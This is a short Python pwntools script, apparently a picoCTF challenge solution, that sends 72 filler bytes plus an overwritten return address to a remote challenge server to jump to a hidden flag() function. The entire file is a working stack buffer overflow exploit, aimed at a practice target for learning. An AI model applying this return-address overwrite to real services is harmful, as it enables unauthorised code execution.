#!/usr/bin/python3
from pwn import *

# flag address 0x401236, found using objdump -d vuln | grep flag
# offset to ret: 72
flag = 0x401246

# try 8 different places in flag()
payload = b"A"*72 + p64(0x401236) # can also be done using elf.sym.flag locally

io = remote("saturn.picoctf.net", 52968)
io.sendlineafter(b"Welcome to 64-bit. Give me a string that gets you the flag:", payload)
io.interactive()
